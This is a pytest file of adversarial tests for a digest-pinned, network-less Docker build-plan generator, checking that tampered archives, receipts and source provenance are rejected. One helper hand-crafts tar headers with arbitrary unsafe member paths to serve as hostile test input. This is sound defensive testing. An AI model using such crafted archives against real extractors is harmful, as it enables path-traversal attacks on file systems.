"""Adversarial tests for the pure matched-v3 CPU OCI build-plan contract."""

from __future__ import annotations

import ast
import copy
import dataclasses
import hashlib
import json
from pathlib import Path
from typing import Any

import pytest

from alberta_framework.benchmarks import forager_matched_v3_cpu_oci_build_plan as plan
from alberta_framework.benchmarks import forager_matched_v3_cpu_runtime_lock as runtime_lock
from alberta_framework.benchmarks import (
    forager_matched_v3_cpu_runtime_lock_issuer as issuer,
)
from alberta_framework.benchmarks import forager_matched_v3_cpu_wheelhouse as wheelhouse
from alberta_framework.benchmarks import (
    forager_matched_v3_external_materialization as external_materialization,
)
from alberta_framework.benchmarks import (
    forager_matched_v3_external_source_publication as external_source_publication,
)
from alberta_framework.benchmarks import (
    forager_matched_v3_local_source_bundle as local_source_bundle,
)
from alberta_framework.benchmarks.forager_matched_v3_cpu_runtime_lock_issuer import (
    CpuRuntimeLockIssuanceArtifacts,
)

pytestmark = pytest.mark.unit


def _canonical(value: Any) -> bytes:
    return (
        json.dumps(
            value,
            allow_nan=False,
            ensure_ascii=True,
            separators=(",", ":"),
            sort_keys=True,
        ).encode("ascii")
        + b"\n"
    )


def _sha(value: bytes | str) -> str:
    raw = value.encode("ascii") if isinstance(value, str) else value
    return hashlib.sha256(raw).hexdigest()


def _archive(members: list[tuple[str, bytes, int]]) -> bytes:
    result = bytearray()
    for path, raw, mode in members:
        result.extend(plan._canonical_ustar_header(path, len(raw), mode))
        result.extend(raw)
        result.extend(bytes((-len(raw)) % 512))
    result.extend(bytes(1024))
    result.extend(bytes((-len(result)) % 10_240))
    return bytes(result)


def _archive_with_unsafe_path(path: str, raw: bytes) -> bytes:
    safe_path = "aa/evil.py"
    if len(path) != len(safe_path):
        raise AssertionError("test path must preserve the header field length")
    header = bytearray(plan._canonical_ustar_header(safe_path, len(raw), 0o444))
    header[0:100] = bytes(100)
    header[0 : len(path)] = path.encode("ascii")
    header[148:156] = b"        "
    header[148:156] = format(sum(header), "06o").encode("ascii") + b"\0 "
    result = bytearray(header)
    result.extend(raw)
    result.extend(bytes((-len(raw)) % 512))
    result.extend(bytes(1024))
    result.extend(bytes((-len(result)) % 10_240))
    return bytes(result)


def _materialize_source_members(
    root: Path,
    members: list[tuple[str, bytes, int]],
    *,
    omitted_paths: frozenset[str] = frozenset(),
) -> None:
    for path, payload, mode in members:
        if path in omitted_paths:
            continue
        target = root / path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(payload)
        target.chmod(mode)


def _source(
    role: str,
    *,
    members: list[tuple[str, bytes, int]] | None = None,
) -> tuple[plan.CanonicalSourceBundleInput, dict[str, Any]]:
    exact_members = members
    if exact_members is None:
        exact_members = (
            [
                ("alberta_framework/__init__.py", b'"""synthetic"""\n', 0o444),
                ("pyproject.toml", b'[project]\nname="alberta-framework"\n', 0o444),
            ]
            if role == "local_alberta"
            else [
                ("agents/example.py", b"VALUE = 1\n", 0o444),
                ("pyproject.toml", b'[project]\nname="continual-foragax-agents"\n', 0o444),
            ]
        )
    raw = _archive(exact_members)
    normalized_members = [
        {
            "mode": "0444" if mode == 0o444 else "0555",
            "path": path,
            "sha256": _sha(payload),
            "size_bytes": len(payload),
        }
        for path, payload, mode in exact_members
    ]
    source_manifest_sha256 = _sha(f"{role}:manifest")
    source_tree_sha256 = _sha(f"{role}:tree")
    staging_manifest_sha256 = (
        _sha("external_foragax:staging-manifest") if role == "external_foragax" else None
    )
    receipt: dict[str, Any]
    if role == "external_foragax":
        upstream = runtime_lock.cpu_runtime_lock_descriptor()["upstream"]
        receipt = {
            "archive": {
                "member_count": len(normalized_members),
                "members": [
                    {**member, "provenance": "materializer_v2_regular_file"}
                    for member in normalized_members
                ],
                "sha256": _sha(raw),
                "size_bytes": len(raw),
            },
            "external_source_manifest": {
                "commit_git_sha1": upstream["commit_git_sha1"],
                "full_file_sha256": source_manifest_sha256,
                "identity_sha256": (
                    external_materialization.PINNED_EXTERNAL_MATERIALIZATION_IDENTITY_SHA256
                ),
                "source_tree_sha256": source_tree_sha256,
                "tree_git_sha1": upstream["tree_git_sha1"],
            },
            "publication_contract": {
                "descriptor_sha256": (
                    external_source_publication.EXTERNAL_SOURCE_PUBLICATION_CONTRACT_DESCRIPTOR_SHA256
                )
            },
            "staging_manifest": {"full_file_sha256": staging_manifest_sha256},
        }
    else:
        receipt = {
            "archive": {
                "member_count": len(normalized_members),
                "sha256": _sha(raw),
                "size_bytes": len(raw),
            },
            "descriptor_binding": {
                "sha256": local_source_bundle.LOCAL_SOURCE_BUNDLE_DESCRIPTOR_SHA256
            },
            "members": normalized_members,
            "source_snapshot": {
                "manifest_sha256": source_manifest_sha256,
                "tree_sha256": source_tree_sha256,
            },
        }
    receipt_raw = _canonical(receipt)
    return plan.CanonicalSourceBundleInput(
        archive_bytes=raw,
        expected_archive_sha256=_sha(raw),
        expected_archive_size_bytes=len(raw),
        expected_member_count=len(exact_members),
        receipt_bytes=receipt_raw,
        expected_receipt_sha256=_sha(receipt_raw),
        source_manifest_sha256=source_manifest_sha256,
        source_tree_sha256=source_tree_sha256,
        staging_manifest_sha256=staging_manifest_sha256,
    ), receipt


def _fixture() -> dict[str, Any]:
    upstream_contract = runtime_lock.cpu_runtime_lock_descriptor()["upstream"]
    wheel_payloads = {
        "jax": b"synthetic jax wheel bytes",
        "jaxlib": b"synthetic jaxlib wheel bytes",
    }
    entries: list[dict[str, Any]] = []
    packages: list[dict[str, Any]] = []
    members: list[dict[str, Any]] = []
    for name in sorted(wheel_payloads):
        version = "0.11.0"
        filename = f"{name}-{version}-py3-none-any.whl"
        wheel_sha = _sha(wheel_payloads[name])
        archive_name = f"{wheel_sha}.whl"
        cas_key = f"sha256/{wheel_sha[:2]}/{wheel_sha}/{filename}"
        body_sha = _sha(f"{name}:wheel-body")
        entries.append(
            {
                "archive_name": archive_name,
                "cas_key": cas_key,
                "filename": filename,
                "name": name,
                "sha256": wheel_sha,
                "size_bytes": len(wheel_payloads[name]),
                "source_url": (
                    "https://files.pythonhosted.org/packages/aa/bb/" + "c" * 60 + f"/{filename}"
                ),
                "version": version,
                "wheel_body_sha256": body_sha,
            }
        )
        packages.append(
            {
                "name": name,
                "version": version,
                "wheels": [
                    {
                        "cas_key": cas_key,
                        "filename": filename,
                        "sha256": wheel_sha,
                        "size_bytes": len(wheel_payloads[name]),
                        "wheel_body_sha256": body_sha,
                    }
                ],
            }
        )
        members.append(
            {
                "archive_name": archive_name,
                "filename": filename,
                "mode": "0444",
                "sha256": wheel_sha,
                "size_bytes": len(wheel_payloads[name]),
            }
        )
    wheel_members = [
        (
            member["archive_name"],
            wheel_payloads[
                next(entry["name"] for entry in entries if entry["sha256"] == member["sha256"])
            ],
            0o444,
        )
        for member in sorted(members, key=lambda item: item["archive_name"])
    ]
    wheel_archive = _archive(wheel_members)
    receipt_raw = _canonical({"kind": "synthetic-wheelhouse-receipt"})
    cas_raw = _canonical({"kind": "synthetic-cas"})
    runtime_raw = _canonical({"kind": "synthetic-runtime-lock"})
    capture_raw = _canonical({"kind": "synthetic-capture"})
    envelope_raw = _canonical({"kind": "synthetic-envelope"})
    archive_inventory_sha = _sha("wheelhouse-member-inventory")
    receipt_body_sha = _sha("wheelhouse-receipt-body")
    cas_body_sha = _sha("cas-body")
    wheel_inventory_sha = _sha("wheel-inventory")
    total_bytes = sum(entry["size_bytes"] for entry in entries)
    receipt = {
        "archive": {
            "inventory_sha256": archive_inventory_sha,
            "members": members,
            "sha256": _sha(wheel_archive),
            "size_bytes": len(wheel_archive),
        },
        "receipt_body_sha256": receipt_body_sha,
    }
    cas = {
        "entries": entries,
        "entry_count": len(entries),
        "manifest_body_sha256": cas_body_sha,
        "source_archive": {
            "inventory_sha256": archive_inventory_sha,
            "sha256": _sha(wheel_archive),
            "size_bytes": len(wheel_archive),
        },
        "source_receipt": {
            "body_sha256": receipt_body_sha,
            "full_file_sha256": _sha(receipt_raw),
        },
        "total_bytes": total_bytes,
        "wheel_inventory_sha256": wheel_inventory_sha,
    }
    lock = {
        "lock_body_sha256": _sha("runtime-lock-body"),
        "packages": packages,
        "upstream": {
            "archive": {
                "sha256": upstream_contract["archive_sha256"],
                "size_bytes": upstream_contract["archive_size_bytes"],
            },
            "commit_git_sha1": upstream_contract["commit_git_sha1"],
            "repository_id": upstream_contract["repository_id"],
            "repository_url": upstream_contract["repository_url"],
            "tree_git_sha1": upstream_contract["tree_git_sha1"],
        },
        "wheelhouse": {
            "archive": {
                "sha256": _sha(wheel_archive),
                "size_bytes": len(wheel_archive),
            },
            "manifest": {
                "body_sha256": cas_body_sha,
                "entry_count": len(entries),
                "inventory_sha256": wheel_inventory_sha,
                "sha256": _sha(cas_raw),
                "size_bytes": len(cas_raw),
                "total_bytes": total_bytes,
            },
        },
    }
    artifacts = issuer.CpuRuntimeLockIssuanceArtifacts(
        runtime_lock_bytes=runtime_raw,
        runtime_lock_sha256=_sha(runtime_raw),
        cas_manifest_bytes=cas_raw,
        cas_manifest_sha256=_sha(cas_raw),
        issuance_envelope_bytes=envelope_raw,
        issuance_envelope_sha256=_sha(envelope_raw),
        capture_manifest_bytes=capture_raw,
        capture_manifest_sha256=_sha(capture_raw),
        wheelhouse_receipt_bytes=receipt_raw,
        wheelhouse_receipt_sha256=_sha(receipt_raw),
        root_pin_count=issuer.PRODUCTION_ROOT_PIN_COUNT,
        root_pin_inventory_sha256=_sha("root-pins"),
    )
    external, external_receipt = _source("external_foragax")
    local, local_receipt = _source("local_alberta")
    return {
        "artifacts": artifacts,
        "cas": cas,
        "entries": entries,
        "external": external,
        "external_receipt": external_receipt,
        "local": local,
        "local_receipt": local_receipt,
        "lock": lock,
        "receipt": receipt,
        "wheel_archive": wheel_archive,
    }


def _patch_validators(
    monkeypatch: pytest.MonkeyPatch,
    values: dict[str, Any],
) -> None:
    def validate_production(
        artifacts: CpuRuntimeLockIssuanceArtifacts,
        **_kwargs: Any,
    ) -> CpuRuntimeLockIssuanceArtifacts:
        if id(artifacts) != id(values["artifacts"]):
            raise AssertionError("unexpected issuance artifacts")
        return artifacts

    def parse_lock(raw: bytes, *, expected_file_sha256: str) -> dict[str, Any]:
        assert raw == values["artifacts"].runtime_lock_bytes
        assert expected_file_sha256 == values["artifacts"].runtime_lock_sha256
        return copy.deepcopy(values["lock"])

    def parse_cas(raw: bytes, *, expected_file_sha256: str) -> dict[str, Any]:
        assert raw == values["artifacts"].cas_manifest_bytes
        assert expected_file_sha256 == values["artifacts"].cas_manifest_sha256
        return copy.deepcopy(values["cas"])

    def parse_receipt(raw: bytes, *, expected_file_sha256: str) -> dict[str, Any]:
        assert raw == values["artifacts"].wheelhouse_receipt_bytes
        assert expected_file_sha256 == values["artifacts"].wheelhouse_receipt_sha256
        return copy.deepcopy(values["receipt"])

    def parse_external_source_receipt(raw: bytes, *, expected_file_sha256: str) -> dict[str, Any]:
        assert expected_file_sha256 == values["external"].expected_receipt_sha256
        if "external_source_manifest" not in json.loads(raw):
            raise ValueError("receipt has the wrong source role")
        return copy.deepcopy(values["external_receipt"])

    def parse_local_source_receipt(raw: bytes, *, expected_receipt_sha256: str) -> dict[str, Any]:
        assert expected_receipt_sha256 == values["local"].expected_receipt_sha256
        if "source_snapshot" not in json.loads(raw):
            raise ValueError("receipt has the wrong source role")
        return copy.deepcopy(values["local_receipt"])

    monkeypatch.setattr(
        issuer, "validate_production_cpu_runtime_lock_issuance", validate_production
    )
    monkeypatch.setattr(runtime_lock, "parse_cpu_runtime_lock", parse_lock)
    monkeypatch.setattr(issuer, "parse_cpu_runtime_wheelhouse_cas_manifest", parse_cas)
    monkeypatch.setattr(wheelhouse, "parse_cpu_wheelhouse_receipt", parse_receipt)
    monkeypatch.setattr(
        external_source_publication,
        "parse_external_source_publication_receipt",
        parse_external_source_receipt,
    )
    monkeypatch.setattr(
        local_source_bundle,
        "parse_matched_v3_local_source_bundle_receipt",
        parse_local_source_receipt,
    )
    monkeypatch.setattr(runtime_lock, "PRODUCTION_DISTRIBUTION_COUNT", len(values["entries"]))


def _build(
    monkeypatch: pytest.MonkeyPatch,
    values: dict[str, Any] | None = None,
) -> plan.CpuOciBuildPlanArtifacts:
    exact = _fixture() if values is None else values
    _patch_validators(monkeypatch, exact)
    return plan.build_matched_v3_cpu_oci_build_plan(
        issuance_artifacts=exact["artifacts"],
        expected_root_pin_inventory_sha256=_sha("root-pins"),
        expected_selected_wheel_inventory_sha256=_sha("selected-wheels"),
        expected_resolution_lock_sha256=_sha("resolution-lock"),
        expected_resolution_lock_size_bytes=1_000,
        wheelhouse_archive_bytes=exact["wheel_archive"],
        external_foragax_source=exact["external"],
        local_alberta_source=exact["local"],
    )


def _rehash_body(value: dict[str, Any]) -> None:
    body = copy.deepcopy(value)
    body.pop("plan_body_sha256", None)
    value["plan_body_sha256"] = _sha(_canonical(body))


def test_build_plan_is_deterministic_digest_pinned_networkless_and_non_authorizing(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    values = _fixture()
    _patch_validators(monkeypatch, values)
    first = _build(monkeypatch, values)
    second = _build(monkeypatch, values)

    assert first == second
    parsed = plan.parse_cpu_oci_build_plan(
        first.plan_bytes,
        expected_file_sha256=first.plan_sha256,
    )
    assert parsed["base_image"] == {
        "informational_tag": "3.12.3-slim-bookworm",
        "manifest_digest": plan.BASE_IMAGE_MANIFEST_DIGEST,
        "platform": "linux/amd64",
        "pull_by_tag_allowed": False,
        "reference": (
            "docker.io/library/python@"
            "sha256:fd3817f3a855f6c2ada16ac9468e5ee93e361005bd226fd5a5ee1a504e038c84"
        ),
        "repository": "docker.io/library/python",
    }
    assert parsed["build"]["command"] == [
        "/usr/libexec/docker/cli-plugins/docker-buildx",
        "--builder=default",
        "build",
        "--network=none",
        "--pull=false",
        "--platform=linux/amd64",
        "--file=Dockerfile",
        "--build-arg=SOURCE_DATE_EPOCH=0",
        "--build-arg=BUILDKIT_MULTI_PLATFORM=1",
        "--provenance=false",
        "--sbom=false",
        "--load",
        "--no-cache",
        "--progress=plain",
        "-",
    ]
    assert parsed["build"]["network_mode"] == "none"
    assert parsed["build"]["pull"] is False
    assert parsed["execution_toolchain"] == plan._execution_toolchain()
    assert parsed["build"]["command"][0] == parsed["execution_toolchain"]["buildx_plugin"]["path"]
    assert all(item is False for item in parsed["claims"].values())
    assert parsed["source_install"]["order"] == ["external_foragax", "local_alberta"]
    assert parsed["source_install"]["build_backends_invoked"] is False
    assert parsed["runtime_verification"]["commands"][1] == [
        "/usr/local/bin/python",
        "-I",
        "-S",
        "-B",
        "/opt/elizaos/build/verify-sources.py",
    ]
    source_bindings = {source["role"]: source for source in parsed["bindings"]["sources"]}
    assert source_bindings["external_foragax"]["receipt_sha256"] == (
        values["external"].expected_receipt_sha256
    )
    assert source_bindings["external_foragax"]["receipt_size_bytes"] == len(
        values["external"].receipt_bytes
    )
    assert source_bindings["external_foragax"]["staging_manifest_sha256"] == (
        values["external"].staging_manifest_sha256
    )
    assert (
        source_bindings["external_foragax"]["commit_git_sha1"]
        == (values["lock"]["upstream"]["commit_git_sha1"])
    )
    assert (
        source_bindings["external_foragax"]["tree_git_sha1"]
        == (values["lock"]["upstream"]["tree_git_sha1"])
    )
    assert (
        source_bindings["external_foragax"]["materialization_identity_sha256"]
        == (values["external_receipt"]["external_source_manifest"]["identity_sha256"])
    )
    assert (
        source_bindings["local_alberta"]["producer_descriptor_sha256"]
        == (values["local_receipt"]["descriptor_binding"]["sha256"])
    )
    assert source_bindings["local_alberta"]["staging_manifest_sha256"] is None
    pip_argv = parsed["dependency_install"]["pip_argv"]
    for flag in ("--no-index", "--require-hashes", "--no-deps", "--only-binary=:all:"):
        assert flag in pip_argv
    files = {item["path"]: item["content"] for item in parsed["build"]["generated_files"]}
    assert files["generated/requirements.lock"] == "".join(
        f"{entry['name']}=={entry['version']} --hash=sha256:{entry['sha256']}\n"
        for entry in values["entries"]
    )
    compile(
        files["generated/materialize-wheelhouse.py"],
        "generated/materialize-wheelhouse.py",
        "exec",
    )
    compile(files["generated/verify-sources.py"], "generated/verify-sources.py", "exec")
    compile(files["generated/verify-runtime.py"], "generated/verify-runtime.py", "exec")
    runtime_inventory = json.loads(files["generated/runtime-inventory.json"])
    assert {"haiku", "optax"}.issubset(runtime_inventory["required_imports"])
    assert runtime_inventory["required_functional_probes"] == [
        "flax.linen.Dense.init_apply_jit",
        "haiku.Linear.init_apply_jit",
    ]
    verification_source = files["generated/verify-runtime.py"]
    assert "flax_layer.init" in verification_source
    assert "jax.jit(flax_layer.apply)" in verification_source
    assert "haiku_layer.init" in verification_source
    assert "jax.jit(haiku_layer.apply)" in verification_source
    dockerfile = files["Dockerfile"]
    assert dockerfile.startswith(
        "FROM --platform=linux/amd64 "
        "docker.io/library/python@sha256:fd3817f3a855f6c2ada16ac9468e5ee93e361005bd226fd5a5ee1a504e038c84\n"
    )
    assert "\n+    " not in dockerfile
    dockerfile_lines = dockerfile.splitlines()
    label_start = next(
        index for index, line in enumerate(dockerfile_lines) if line.startswith("LABEL ")
    )
    label_lines = dockerfile_lines[label_start : label_start + 6]
    assert label_lines[0].startswith("LABEL io.elizaos.alberta.forager-matched-v3.")
    assert all(
        line.startswith("    io.elizaos.alberta.forager-matched-v3.") for line in label_lines[1:]
    )
    assert "https://" not in dockerfile
    assert "apt-get" not in dockerfile
    assert 'RUN ["tar"' not in dockerfile
    assert "    TAR_OPTIONS= \\" in dockerfile_lines
    external_extract_run = (
        'RUN ["/usr/bin/tar","--extract","--file",'
        '"/opt/elizaos/input/external-foragax-source.v1.tar","--directory",'
        '"/opt/elizaos/src/external-foragax","--no-same-owner","--no-same-permissions",'
        '"--keep-old-files"]'
    )
    local_extract_run = (
        'RUN ["/usr/bin/tar","--extract","--file",'
        '"/opt/elizaos/input/local-alberta-source.v1.tar","--directory",'
        '"/opt/elizaos/src/local-alberta","--no-same-owner","--no-same-permissions",'
        '"--keep-old-files"]'
    )
    source_verify_run = (
        'RUN ["/usr/local/bin/python","-I","-S","-B","/opt/elizaos/build/verify-sources.py"]'
    )
    wheelhouse_materialize_run = (
        'RUN ["/usr/local/bin/python","-I","-S","-B",'
        '"/opt/elizaos/build/materialize-wheelhouse.py"]'
    )
    runtime_verify_run = (
        'RUN ["/usr/local/bin/python","-I","-B","/opt/elizaos/build/verify-runtime.py"]'
    )
    assert dockerfile_lines.count(external_extract_run) == 1
    assert dockerfile_lines.count(local_extract_run) == 1
    assert dockerfile_lines.index(external_extract_run) < dockerfile_lines.index(local_extract_run)
    assert dockerfile_lines.index(local_extract_run) < dockerfile_lines.index(source_verify_run)
    assert dockerfile_lines.index(source_verify_run) < dockerfile_lines.index(
        wheelhouse_materialize_run
    )
    pip_install_line = next(
        line
        for line in dockerfile_lines
        if line.startswith('RUN ["/usr/local/bin/python","-m","pip",')
    )
    assert dockerfile_lines.index(wheelhouse_materialize_run) < dockerfile_lines.index(
        pip_install_line
    )
    assert dockerfile_lines.index(source_verify_run) < dockerfile_lines.index(
        "COPY generated/elizaos-forager-sources.pth "
        "/usr/local/lib/python3.12/site-packages/elizaos-forager-sources.pth"
    )
    assert dockerfile_lines.index(source_verify_run) < dockerfile_lines.index(runtime_verify_run)


def test_local_snapshot_identities_cannot_substitute_for_source_payload(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    values = _fixture()

    def forbidden(*_args: Any, **_kwargs: Any) -> Any:
        raise AssertionError("runtime issuance must not be reached")

    monkeypatch.setattr(issuer, "validate_production_cpu_runtime_lock_issuance", forbidden)
    with pytest.raises(
        plan.ForagerMatchedV3CpuOciBuildPlanError,
        match="local Alberta canonical USTAR payload is mandatory",
    ):
        plan.build_matched_v3_cpu_oci_build_plan(
            issuance_artifacts=values["artifacts"],
            expected_root_pin_inventory_sha256=_sha("root-pins"),
            expected_selected_wheel_inventory_sha256=_sha("selected-wheels"),
            expected_resolution_lock_sha256=_sha("resolution-lock"),
            expected_resolution_lock_size_bytes=1_000,
            wheelhouse_archive_bytes=values["wheel_archive"],
            external_foragax_source=values["external"],
            local_alberta_source=None,
        )


@pytest.mark.parametrize("role", ["external", "local"])
def test_source_bundle_byte_substitution_fails_under_independent_pin(
    monkeypatch: pytest.MonkeyPatch,
    role: str,
) -> None:
    values = _fixture()
    source = values[role]
    values[role] = dataclasses.replace(
        source,
        archive_bytes=source.archive_bytes[:-1] + b"\x01",
    )
    _patch_validators(monkeypatch, values)
    with pytest.raises(plan.ForagerMatchedV3CpuOciBuildPlanError, match="full-file identity"):
        _build(monkeypatch, values)


@pytest.mark.parametrize("role", ["external", "local"])
def test_source_receipt_byte_tamper_fails_under_old_digest(
    monkeypatch: pytest.MonkeyPatch,
    role: str,
) -> None:
    values = _fixture()
    source = values[role]
    values[role] = dataclasses.replace(
        source,
        receipt_bytes=source.receipt_bytes[:-1] + b" ",
    )
    _patch_validators(monkeypatch, values)
    with pytest.raises(plan.ForagerMatchedV3CpuOciBuildPlanError, match="receipt full-file"):
        _build(monkeypatch, values)


@pytest.mark.parametrize("role", ["external", "local"])
def test_source_receipt_archive_identity_cannot_substitute_for_raw_ustar(
    monkeypatch: pytest.MonkeyPatch,
    role: str,
) -> None:
    values = _fixture()
    receipt = values[f"{role}_receipt"]
    receipt["archive"]["sha256"] = _sha(f"{role}:different-archive")
    _patch_validators(monkeypatch, values)
    with pytest.raises(plan.ForagerMatchedV3CpuOciBuildPlanError, match="receipt archive identity"):
        _build(monkeypatch, values)


@pytest.mark.parametrize("role", ["external", "local"])
def test_new_raw_ustar_cannot_be_paired_with_old_source_receipt(
    monkeypatch: pytest.MonkeyPatch,
    role: str,
) -> None:
    values = _fixture()
    source = values[role]
    first_path = "agents/example.py" if role == "external" else "alberta_framework/__init__.py"
    second_payload = (
        b'[project]\nname="continual-foragax-agents"\n'
        if role == "external"
        else b'[project]\nname="alberta-framework"\n'
    )
    changed = _archive(
        [
            (first_path, b"CHANGED = 1\n", 0o444),
            ("pyproject.toml", second_payload, 0o444),
        ]
    )
    values[role] = dataclasses.replace(
        source,
        archive_bytes=changed,
        expected_archive_sha256=_sha(changed),
        expected_archive_size_bytes=len(changed),
    )
    _patch_validators(monkeypatch, values)
    with pytest.raises(plan.ForagerMatchedV3CpuOciBuildPlanError, match="receipt archive identity"):
        _build(monkeypatch, values)


@pytest.mark.parametrize("role", ["external", "local"])
@pytest.mark.parametrize("field", ["path", "mode", "sha256", "size_bytes"])
def test_source_receipt_member_inventory_is_exactly_bound_to_raw_ustar(
    monkeypatch: pytest.MonkeyPatch,
    role: str,
    field: str,
) -> None:
    values = _fixture()
    receipt = values[f"{role}_receipt"]
    members = receipt["archive"]["members"] if role == "external" else receipt["members"]
    replacement: str | int
    if field == "path":
        replacement = "different.py"
    elif field == "mode":
        replacement = "0555" if members[0]["mode"] == "0444" else "0444"
    elif field == "sha256":
        replacement = _sha(f"{role}:different-member")
    else:
        replacement = members[0]["size_bytes"] + 1
    members[0][field] = replacement
    _patch_validators(monkeypatch, values)
    with pytest.raises(plan.ForagerMatchedV3CpuOciBuildPlanError, match="member inventory"):
        _build(monkeypatch, values)


@pytest.mark.parametrize("role", ["external", "local"])
@pytest.mark.parametrize("field", ["source_manifest_sha256", "source_tree_sha256"])
def test_arbitrary_caller_source_provenance_is_rejected_against_receipt(
    monkeypatch: pytest.MonkeyPatch,
    role: str,
    field: str,
) -> None:
    values = _fixture()
    values[role] = dataclasses.replace(values[role], **{field: _sha(f"{role}:{field}:fake")})
    _patch_validators(monkeypatch, values)
    with pytest.raises(plan.ForagerMatchedV3CpuOciBuildPlanError, match="provenance"):
        _build(monkeypatch, values)


def test_arbitrary_external_staging_manifest_pin_is_rejected_against_receipt(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    values = _fixture()
    values["external"] = dataclasses.replace(
        values["external"], staging_manifest_sha256=_sha("fake-stage-manifest")
    )
    _patch_validators(monkeypatch, values)
    with pytest.raises(plan.ForagerMatchedV3CpuOciBuildPlanError, match="staging.*provenance"):
        _build(monkeypatch, values)


def test_local_source_rejects_external_staging_manifest_pin(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    values = _fixture()
    values["local"] = dataclasses.replace(
        values["local"], staging_manifest_sha256=_sha("local-must-not-have-stage")
    )
    _patch_validators(monkeypatch, values)
    with pytest.raises(plan.ForagerMatchedV3CpuOciBuildPlanError, match="local.*staging"):
        _build(monkeypatch, values)


@pytest.mark.parametrize("role", ["external", "local"])
def test_source_receipt_roles_cannot_be_swapped(
    monkeypatch: pytest.MonkeyPatch,
    role: str,
) -> None:
    values = _fixture()
    other = "local" if role == "external" else "external"
    values[role] = dataclasses.replace(
        values[role],
        receipt_bytes=values[other].receipt_bytes,
        expected_receipt_sha256=values[other].expected_receipt_sha256,
    )
    _patch_validators(monkeypatch, values)
    with pytest.raises(plan.ForagerMatchedV3CpuOciBuildPlanError, match="producer receipt parser"):
        _build(monkeypatch, values)


@pytest.mark.parametrize("field", ["commit_git_sha1", "tree_git_sha1"])
def test_external_receipt_git_identity_must_match_runtime_lock_upstream(
    monkeypatch: pytest.MonkeyPatch,
    field: str,
) -> None:
    values = _fixture()
    values["external_receipt"]["external_source_manifest"][field] = "a" * 40
    _patch_validators(monkeypatch, values)
    with pytest.raises(plan.ForagerMatchedV3CpuOciBuildPlanError, match="Git identity"):
        _build(monkeypatch, values)


def test_plan_validator_rejects_external_source_git_identity_rebound_from_upstream(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    artifact = _build(monkeypatch)
    value = json.loads(artifact.plan_bytes)
    value["bindings"]["sources"][0]["commit_git_sha1"] = "a" * 40
    _rehash_body(value)
    with pytest.raises(plan.ForagerMatchedV3CpuOciBuildPlanError, match="Git provenance"):
        plan.validate_cpu_oci_build_plan(value)


def test_source_bundle_rejects_noncanonical_member_order(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    values = _fixture()
    values["local"], values["local_receipt"] = _source(
        "local_alberta",
        members=[
            ("pyproject.toml", b'[project]\nname="alberta-framework"\n', 0o444),
            ("alberta_framework/__init__.py", b'"""synthetic"""\n', 0o444),
        ],
    )
    _patch_validators(monkeypatch, values)
    with pytest.raises(plan.ForagerMatchedV3CpuOciBuildPlanError, match="path order"):
        _build(monkeypatch, values)


def test_source_bundle_accepts_case_distinct_paths_and_cross_binds_exact_inventory(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    values = _fixture()
    values["external"], values["external_receipt"] = _source(
        "external_foragax",
        members=[
            ("metrics/NTKRank_LOP_vs_NoLOP.png", b"upper-case metric\n", 0o444),
            ("metrics/ntkrank_LOP_vs_NoLOP.png", b"lower-case metric\n", 0o444),
            ("pyproject.toml", b'[project]\nname="continual-foragax-agents"\n', 0o444),
        ],
    )

    artifact = _build(monkeypatch, values)
    parsed = plan.parse_cpu_oci_build_plan(
        artifact.plan_bytes,
        expected_file_sha256=artifact.plan_sha256,
    )
    external_binding = parsed["bindings"]["sources"][0]
    exact_members = [
        {key: value for key, value in member.items() if key != "provenance"}
        for member in values["external_receipt"]["archive"]["members"]
    ]

    assert external_binding["member_count"] == 3
    assert external_binding["member_inventory_sha256"] == _sha(
        _canonical({"members": exact_members})
    )
    assert any(
        "case-sensitive Linux filesystem semantics" in limitation
        for limitation in parsed["limitations"]
    )


def test_case_distinct_source_receipt_member_spelling_remains_exactly_cross_bound(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    values = _fixture()
    values["external"], values["external_receipt"] = _source(
        "external_foragax",
        members=[
            ("metrics/NTKRank_LOP_vs_NoLOP.png", b"upper-case metric\n", 0o444),
            ("metrics/ntkrank_LOP_vs_NoLOP.png", b"lower-case metric\n", 0o444),
            ("pyproject.toml", b'[project]\nname="continual-foragax-agents"\n', 0o444),
        ],
    )
    values["external_receipt"]["archive"]["members"][0]["path"] = "metrics/ntkrank_LOP_vs_NoLOP.png"

    with pytest.raises(plan.ForagerMatchedV3CpuOciBuildPlanError, match="member inventory"):
        _build(monkeypatch, values)


def test_source_bundle_rejects_exact_duplicate_member_path(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    values = _fixture()
    values["external"], values["external_receipt"] = _source(
        "external_foragax",
        members=[
            ("metrics/rank.png", b"first metric\n", 0o444),
            ("metrics/rank.png", b"second metric\n", 0o444),
            ("pyproject.toml", b'[project]\nname="continual-foragax-agents"\n', 0o444),
        ],
    )

    with pytest.raises(plan.ForagerMatchedV3CpuOciBuildPlanError, match="duplicate"):
        _build(monkeypatch, values)


def test_source_bundle_rejects_exact_file_descendant_collision(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    values = _fixture()
    values["external"], values["external_receipt"] = _source(
        "external_foragax",
        members=[
            ("metrics/rank", b"file\n", 0o444),
            ("metrics/rank/value.png", b"descendant\n", 0o444),
            ("pyproject.toml", b'[project]\nname="continual-foragax-agents"\n', 0o444),
        ],
    )

    with pytest.raises(plan.ForagerMatchedV3CpuOciBuildPlanError, match="file/descendant"):
        _build(monkeypatch, values)


def test_casefold_only_file_descendant_names_follow_case_sensitive_linux_semantics(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    values = _fixture()
    values["external"], values["external_receipt"] = _source(
        "external_foragax",
        members=[
            ("metrics/RANK", b"case-distinct file\n", 0o444),
            ("metrics/rank/value.png", b"case-distinct descendant\n", 0o444),
            ("pyproject.toml", b'[project]\nname="continual-foragax-agents"\n', 0o444),
        ],
    )

    artifact = _build(monkeypatch, values)
    parsed = plan.parse_cpu_oci_build_plan(
        artifact.plan_bytes,
        expected_file_sha256=artifact.plan_sha256,
    )

    assert parsed["bindings"]["sources"][0]["member_count"] == 3
    assert any(
        "case-sensitive Linux filesystem semantics" in limitation
        for limitation in parsed["limitations"]
    )


def test_generated_source_verifier_accepts_exact_case_distinct_extraction(
